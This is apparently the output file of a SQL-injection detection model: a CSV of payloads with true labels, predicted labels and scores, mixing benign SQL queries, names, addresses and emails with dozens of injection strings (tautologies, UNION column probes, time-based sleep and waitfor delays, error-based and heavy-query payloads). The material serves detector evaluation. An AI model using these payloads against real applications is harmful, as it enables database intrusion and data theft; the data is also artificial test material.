payload,label,hardened_pred_label,hardened_pred_score
"1'  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  'medg'  =  'medg",1,1,0.9999932
SELECT AVG ( shot ) FROM design,0,0,7.734252e-06
SELECT * FROM history FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM seldom,0,0,7.5221556e-06
derbarn henriquez,0,0,7.5310204e-06
colunga corrius,0,0,7.599299e-06
08466616v,0,0,7.5446137e-06
"1'+  (  select 'nzgq' where 7230  =  7230 and elt  (  1210  =  1210,sleep  (  5   )    )     )  +'",1,1,0.9999932
"-7568""   )    )     )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  ""jxge"" like ""jxge",1,1,0.9999932
-8292%'  )   or 8571  =  8571--,1,1,0.9999933
mediona,0,0,8.105671e-06
o$ficinesca,0,0,7.5104354e-06
SELECT * FROM forth WHERE wish BETWEEN '1996-07-01' AND '1996-07-31',0,0,7.711287e-06
"1""  )   as dien where 4022  =  4022",1,1,0.9999933
"  UPDATE lying SET found =  'quickly', City =  'highest' WHERE clean =  sunlight",0,0,7.472919e-06
"1'  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  'jhxh'  =  'jhxh",1,1,0.9999932
"-6431""   )    )    union all select 2358,2358,2358,2358,2358,2358,2358,2358,2358,2358#",1,1,0.9999932
"-3853""  )   where 4626  =  4626 union all select 4626,4626,4626--",1,1,0.9999932
cigales,0,0,8.085859e-06
1'   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  'snoa'  =  'snoa,1,1,0.9999932
boniquet jeria,0,0,7.593865e-06
SELECT importance ( s ) FROM carried INNER JOIN,0,0,7.901205e-06
1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and 'bwtk'  =  'bwtk,1,1,0.9999932
arganza,0,0,8.079462e-06
SELECT * FROM same WHERE    NOT simply = 'south',0,0,7.6272227e-06
ribadesella,0,0,7.844144e-06
SELECT TOP 3 * FROM against SELECT * FROM game 3SELECT * FROM popular,0,0,7.732666e-06
beckwith,0,0,8.09501e-06
6.34191E+15,0,0,7.433535e-06
SELECT * FROM college WHERE thing = 'lake'  AND City = 'spider',0,0,7.6396855e-06
campoo de yuso,0,0,7.5596017e-06
c406l2n5,0,0,7.516082e-06
SELECT TOP 3 * FROM ear SELECT * FROM about 3SELECT * FROM badly,0,0,7.758646e-06
"  SELECT giant AS rhyme, copper AS [particular]  FROM loose",0,0,7.435889e-06
nolay,0,0,7.798883e-06
"1' where 8969  =  8969 union all select null,null,null,null,null--",1,1,0.9999933
33560,0,0,8.09759e-06
"1  )   as wvpl where 9791  =  9791 and make_set  (  3491  =  9067,9067  )  --",1,1,0.9999932
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c82c5dbb23' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0,0,8.059361e-06
SELECT stick ( s ) FROM gentle INNER JOIN,0,0,7.637865e-06
velasque9,0,0,7.67812e-06
" or 1  =  1 or """"  =  ",1,1,0.9999933
"INSERT INTO were  ( tightly, must, house )  VALUES  ( 'weight', 'because', 'mad' )  ",0,0,7.3962547e-06
cantoria,0,0,7.840876e-06
maduric@biosoftware.th,0,0,7.4228096e-06
"1' where 1031  =  1031 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",1,1,0.9999932
"1'  )   union all select null,null,null,null,null,null,null,null,null#",1,1,0.9999933
"1%""  )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""%""  =  """,1,1,0.9999932
3.24545E+15,0,0,7.4276604e-06
72219452g,0,0,7.5713538e-06
"-6681""  )   or 5251  =  1162",1,1,0.9999933
1' in boolean mode  )   order by 1--,1,1,0.9999933
SELECT thick ( s ) FROM pleasant INNER JOIN,0,0,7.5801177e-06
973,0,0,8.033041e-06
" select * from users where id  =  1 <@$$ union select 1,version  (    )   -- 1",1,1,0.9999932
select * from users where id  =  '1'<@.. or 1  =  1 -- 1',1,1,0.9999933
SELECT year FROM sand,0,0,7.648799e-06
"1'  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  'zpzf'  =  'zpzf",1,1,0.9999932
1  )   as fxfe where 1148  =  1148 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1,1,0.9999931
"-4694'  )   where 1501  =  1501 union all select 1501,1501,1501,1501,1501,1501#",1,1,0.9999932
3.07443E+15,0,0,7.4579752e-06
SELECT occasionally ( s )  FROM mighty,0,0,7.4539576e-06
SELECT * FROM children WHERE pool NOT LIKE '[perhaps]%',0,0,7.699633e-06
1%'   )    )    and 4595  =  4595#,1,1,0.9999933
6a0ato,0,0,7.696659e-06
1'||  (  select 'tzxr' from dual where 2934  =  2934 and 4595  =  4595#,1,1,0.9999933
"   SELECT steady,happened,wait,mathematics,affect     (  (  spent JOIN thirty ON gravity.hidden =  sitting.magic )   INNER JOIN caveON Orders.all =  detail.anybodyID ) ",0,0,7.5233534e-06
"1""   )    )    as paep where 8947  =  8947 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1,1,0.9999932
SELECT * FROM paint WHERE century BETWEEN 'change' AND 'selection',0,0,7.810463e-06
1'+  (  select qsmo where 3172  =  3172,1,1,0.9999933
"  SELECT somewhere,list,up FROM log LEFT JOIN Orders ON income.pieID =  later.disappear ORDER BY summer.coast",0,0,7.3559336e-06
puntagorda,0,0,7.60156e-06
SELECT forest ( s )  FROM struggle FULL OUTER JOIN,0,0,7.657345e-06
"1%'  )   and make_set  (  8403  =  8403,8899  )   and   (  '%'  =  '",1,1,0.9999932
-1772' or 7911  =  4985#,1,1,0.9999932
"1""   )    )    and elt  (  4249  =  4249,7259  )   and    (    (   ""xjdh""  =  ""xjdh",1,1,0.9999932
"-4811'   )    )     )   union all select 4603,4603,4603,4603,4603,4603,4603,4603,4603--",1,1,0.9999932
SELECT AVG ( roof ) FROM burn,0,0,7.814896e-06
48483117z,0,0,7.644168e-06
1 and   (  3020  =  3020  )  *6703,1,1,0.9999933
1'   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  'qfxg'  =  'qfxg,1,1,0.9999932
60,0,0,8.552689e-06
"   SELECT whether, arrange, problemFROM fear WHERE addition  IS NOT NULL",0,0,7.635381e-06
9usta4ui6,0,0,7.5091607e-06
"calle puruuela, 15 6?d",0,0,7.4398185e-06
" select * from users where id  =  '1' union select ""[""_,version  (    )   -- 1'",1,1,0.9999932
1' in boolean mode  )   and 5981  =  6700,1,1,0.9999933
SELECT * FROM writer WHERE lying  BETWEEN 10 AND 20,0,0,7.700176e-06
lavat@ajuntamentbarcelona20.gy,0,0,7.4427708e-06
"   SELECT late, dozen+ ', ' + rapidly+ ' ' + thumb+ ', ' + radio AS teeth  FROM develop",0,0,7.498555e-06
SELECT * FROM ourselves WHERE sad = 'select' LIMIT 3,0,0,7.818974e-06
cecil.wolcott7@librodeapuntes.sv,0,0,7.4887785e-06
SELECT TOP 3 * FROM hurt,0,0,8.216421e-06
urbina granda,0,0,7.700543e-06
and 1 in   (  select var from temp  )  --,1,1,0.9999932
"1 where 6965  =  6965 and elt  (  3933  =  1232,1232  )  --",1,1,0.9999932
"  SELECT partly,field FROM slide WHERE why = 'country' UNION SELECT no, replace FROM youth",0,0,7.4279224e-06
SELECT laugh ( s FROM typical RIGHT JOIN,0,0,7.556617e-06
"  UPDATE appearance SET forget =  'gasoline', City =  'properly' WHERE usual =  enemy",0,0,7.555933e-06
"1'+  (  select 'utlx' where 6256  =  6256 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  +'",1,1,0.9999932
olaf,0,0,8.0704285e-06
l1am217r5,0,0,7.4829104e-06
arima@hormigon-impreso.nu,0,0,7.4412237e-06
22200,0,0,8.113652e-06
bendixsen9@foreignoffice.ps,0,0,7.427441e-06
SELECT option_value FROM wp_options WHERE option_name  =  'kc-fonts' LIMIT 1,0,0,7.4307704e-06
SELECT * FROM independent WHERE including = 'sell' LIMIT 3,0,0,7.937561e-06
"1 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ",1,1,0.9999932
" SELECT SupplierName, City, Country FROM Suppliers; INSERT INTO Customers  ( CustomerName, ContactName, Address, City, PostalCode, Country )  ",0,0,7.523576e-06
"1  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  2160  =  2160",1,1,0.9999932
50227,0,0,8.068766e-06
sant llus,0,0,7.657236e-06
SELECT TOP 3 * FROM paint SELECT * FROM prove 3SELECT * FROM certain,0,0,7.73825e-06
"1""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",1,1,0.9999931
SELECT * FROM doctor 3 SELECT * FROM lying,0,0,7.786895e-06
26580,0,0,8.101374e-06
"1""   )    )    as dshc where 9911  =  9911 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,0.9999932
"  SELECT Orders.towerrID, Employees.them, Employees.its FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.exactlyID ORDER BY Orders.valleyID",0,0,7.3592105e-06
"1""   )    )    or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,1,0.9999932
1'||  (  select 'bsbv' from dual where 5276  =  5276 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu   )    )   ||',1,1,0.9999932
SELECT bound ( s FROM year RIGHT JOIN,0,0,7.6251645e-06
"   SELECT share, spider, plates FROM easy WHERE making  IS NULL",0,0,7.5569706e-06
SELECT promised ( s )  FROM itself FULL OUTER JOIN,0,0,7.600197e-06
SELECT AVG ( slide )  FROM deeply  SELECT SUM ( central ) ,0,0,7.4936365e-06
SELECT * FROM past  WHERE shoe NOT LIKE '[cost]%',0,0,7.944657e-06
SELECT * FROM [Brazil Customers]; CREATE OR REPLACE VIEW [Brazil Customers] AS,0,0,7.654972e-06
FROM  ( SELECT DISTINCT aware FROM mostly ) ,0,0,7.796243e-06
SELECT * FROM giant WHERE forget = 'naturally'  AND City = 'view',0,0,7.705642e-06
select 'qqpjq'||  (  select   (  case when   (  2933  =  2933  )   then 1 else 0 end   )    )   ||'qzvzq',1,1,0.9999932
" select * from users where id  =  '1' or @ @1  =  1 union select 1,version  (    )   -- 1'",1,1,0.9999932
calle bendicion 160,0,0,7.583053e-06
-4607'||  (  select 'wkdg' where 7524  =  7524 order by 1--,1,1,0.9999933
SELECT * FROM remember 3,0,0,8.001427e-06
plouffe4,0,0,7.6671e-06
"calle venus, 81 2-a",0,0,7.427582e-06
SELECT * FROM talk WHERE sugar BETWEEN '1996-07-01' AND '1996-07-31',0,0,7.583169e-06
SELECT TOP 3 * FROM prove WHERE south = 'early',0,0,7.626561e-06
SELECT * FROM equally WHERE crew BETWEEN '1996-07-01' AND '1996-07-31',0,0,7.6851675e-06
milionario.kirkham@programa-gestion-erp.mil,0,0,7.521962e-06
miera,0,0,8.147793e-06
"-6122""  )   union all select 6578,6578--",1,1,0.9999933
tuneu,0,0,7.811112e-06
" select * from users where id  =  1 or \<\ union select null,@@VERSION -- 1",1,1,0.9999932
SELECT MIN ( wooden )  AS sight FROM valuable,0,0,7.698414e-06
"1"" where 6179  =  6179",1,1,0.9999926
1   )    )     )   rlike sleep  (  5  )  #,1,1,0.9999932
-8047' or 3038  =  3038,1,1,0.9999932
SELECT AVG ( easier ) FROM story,0,0,8.042117e-06
SELECT AVG ( swam ) FROM talk SELECT SUM ( today ) ,0,0,7.476398e-06
SELECT TOP 3 * FROM globe WHERE slight = 'early' SELECT * FROM shadow,0,0,7.736922e-06
mendracaveitia torreyas,0,0,7.486379e-06
"1%""   )    )     )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  ""%""  =  """,1,1,0.9999931
mocej*n,0,0,7.5860116e-06
SELECT * FROM Customers  WHERE City LIKE '[a-c]%';,0,0,7.896022e-06
fariba,0,0,8.137954e-06
SELECT yourself FROM fair,0,0,7.755864e-06
"-2059%"" or elt  (  4587  =  3101,3101  )   and ""%""  =  """,1,1,0.9999932
SELECT * FROM rhyme ORDER BY heavy DESC,0,0,7.810404e-06
"1'   )    )    as qhpv where 7049  =  7049 and make_set  (  8403  =  8403,8899  )  --",1,1,0.9999932
pontevedra,0,0,7.711721e-06
SELECT * FROM door WHERE slowly = 'bright'  OR best = 'season',0,0,7.632527e-06
DELETE FROM closely WHERE below = 'higher',0,0,7.789688e-06
SELECT * FROM wide FETCH FIRST 50 PERCENT ROWS ONLY,0,0,7.5795106e-06
"-2857%'   )    )     )   union all select 7167,7167,7167,7167,7167,7167,7167,7167#",1,1,0.9999932
grea,0,0,8.12929e-06
60928646j,0,0,7.673106e-06
SELECT * FROM tonight WHERE potatoes = 'ride'  AND  ( shadow = 'play' OR cage = 'toward' ) ,0,0,7.446136e-06
SELECT * FROM parent WHERE NOT could = 'nation'  AND NOT prevent = 'thank',0,0,7.7564855e-06
06363808f,0,0,7.555075e-06
SELECT TOP 3 * FROM decide,0,0,8.102842e-06
raixa s/n,0,0,7.4904783e-06
giralda,0,0,7.692909e-06
"INSERT INTO smaller ( zebra, afraid, fed, noted, condition, merely )  VALUES  ( 'low', 'spell'. store', 'spread', 'sent', 'instance', 'shallow' )  ",0,0,7.627732e-06
SELECT * FROM figure WHERE ear = 'mean' LIMIT 3,0,0,7.714009e-06
SELECT AVG ( zulu ) FROM wealth,0,0,7.674109e-06
SELECT * FROM  ( SELECT running FROM possibly ) ,0,0,7.549846e-06
"1""  )   as uyns where 4751  =  4751 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --",1,1,0.9999931
"""*""",1,1,0.9999912
encrasar,0,0,7.85909e-06
SELECT * FROM job WHERE wash = 'floating' FETCH FIRST 3 ROWS ONLY,0,0,7.5776456e-06
33001,0,0,8.057608e-06
" SELECT * FROM force ORDER BY powerful, art",0,0,7.914538e-06
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 189 )  ORDER BY meta_id ASC",0,0,7.5476937e-06
SELECT represent ( s ) FROM ordinary INNER JOIN,0,0,7.63517e-06
SELECT * FROM alone WHERE bush BETWEEN 'volume' AND 'spread',0,0,7.8425355e-06
51517640d,0,0,7.684669e-06
 (  select   (  case when   (  8130  =  5894  )   then 8130 else 8130*  (  select 8130 from information_schema.character_sets  )   end   )    ) ,1,1,0.9999932
1'   )    )    as azsd where 3870  =  3870 waitfor delay '0:0:5'--,1,1,0.9999932
1  )   where 2232  =  2232,1,1,0.9999933
SELECT enough FROM yard UNION ALL SELECT whole FROM opportunity ORDER BY itself,0,0,7.4168584e-06
"select * from generate_series  (  9863,9863,case when   (  9863  =  3285  )   then 1 else 0 end  )   limit 1--",1,1,0.9999932
SELECT * FROM bag WHERE should = 'bar'  OR lower = 'difference',0,0,7.741336e-06
SELECT species ( s )  FROM lamp SELECT numeral ( s ) ,0,0,7.5183184e-06
2.97648E+15,0,0,7.425741e-06
3015,0,0,8.000701e-06
SELECT * FROM dollar WHERE standard  BETWEEN 10 AND 20,0,0,7.709251e-06
SELECT * FROM age WHERE equally  BETWEEN 10 AND 20,0,0,7.741698e-06
wanda,0,0,8.099258e-06
"1'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'dssx' like 'dssx",1,1,0.9999932
SELECT TOP 3 * FROM structure WHERE oldest = 'needs',0,0,7.740568e-06
1' or '1'  =  '1,1,1,0.9999932
"1""  )   where 3727  =  3727 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1,1,0.9999932
SELECT * FROM small WHERE silly BETWEEN 'term' AND 'information',0,0,7.716687e-06
"1%'   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  '%'  =  '",1,1,0.9999932
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  ""wdbg"" like ""wdbg",1,1,0.9999932
"  SELECT windowID AS ID, plus AS passage FROM frozen",0,0,7.789317e-06
"  SELECT * FROM bone WHERE ever NOT IN  ( 'planning', 'watch', 'label' )  ",0,0,7.660478e-06
1%'  )   order by 1#,1,1,0.9999932
07441681p,0,0,7.588472e-06
barby,0,0,8.017574e-06
"  SELECT about,bigger FROM began WHERE vote = 'wire' UNION SELECT captain, essential FROM growth",0,0,7.4520317e-06
"  SELECT famousID AS ID, principle AS room FROM children",0,0,7.6212896e-06
372,0,0,8.565185e-06
SELECT column_name FROM table1 RIGHT JOIN table2 ON table1.column_name  =  table2.column_name ;,0,0,7.6223364e-06
1'   )    )     )   and 2542  =  7042--,1,1,0.9999932
SELECT we,0,0,8.034168e-06
SELECT AVG ( mud )  FROM learn  SELECT SUM ( cannot ) ,0,0,7.3674405e-06
SELECT * FROM pupil,0,0,8.020197e-06
poncin@todobetis.mil,0,0,7.434655e-06
5.82525E+15,0,0,7.429736e-06
"sant sever 63, 6-b",0,0,7.5223493e-06
parolero,0,0,7.8625235e-06
"1""  )   as zovk where 4591  =  4591 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",1,1,0.9999932
SELECT AVG ( silver )  FROM concerned  SELECT SUM ( load ) ,0,0,7.837534e-06
gayle@freetag.name,0,0,7.460999e-06
"1' in boolean mode  )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,1,0.9999933
1'  )   union all select null#,1,1,0.9999933
"  SELECT pipeID AS ID, sale AS engine FROM regular",0,0,7.765974e-06
1' and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and 'pziy'  =  'pziy,1,1,0.9999932
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 365884 )  ORDER BY meta_id ASC",0,0,7.529699e-06
29807509s,0,0,7.5876687e-06
"1   )    )    as debc where 7428  =  7428 union all select null,null,null#",1,1,0.9999932
SELECT LOG10 ( 4.5 ) ;,0,0,7.509891e-06
SELECT * FROM ocean 3,0,0,7.7673e-06
1'+  (  select 'wsjk' where 3291  =  3291,1,1,0.9999933
SELECT AVG ( black ) FROM problem,0,0,8.057216e-06
"   SELECT point, man, pinkFROM jungle WHERE canal  IS NOT NULL",0,0,7.5013445e-06
" SELECT column_name ( s )  FROM drawn,lose",0,0,7.4099516e-06
"1"" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""xhvo""  =  ""xhvo",1,1,0.9999932
44368,0,0,8.053045e-06
ferreries,0,0,7.859727e-06
soule terraza,0,0,7.5612743e-06
"-4127%' union all select 9558,9558,9558#",1,1,0.9999933
1 where 4153  =  4153 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1,1,0.9999932
virella altimirs,0,0,7.5258004e-06
SELECT * FROM if  WHERE cage = military,0,0,7.892981e-06
" SELECT column_name ( s )  FROM citizen,action",0,0,7.402627e-06
"INSERT INTO more  ( relationship, why, hand )  VALUES  ( 'empty', 'expect', 'war' )  ",0,0,7.42058e-06
SELECT TOP 50 PERCENT * FROM today SELECT * FROM taught FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM improve,0,0,7.6284596e-06
1  )   as qort where 1554  =  1554,1,1,0.9999933
"1'  )   as uvxl where 6211  =  6211 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",1,1,0.9999932
almazn cayul,0,0,7.546434e-06
vies canales,0,0,7.633801e-06
"1%""   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   ""%""  =  """,1,1,0.9999932
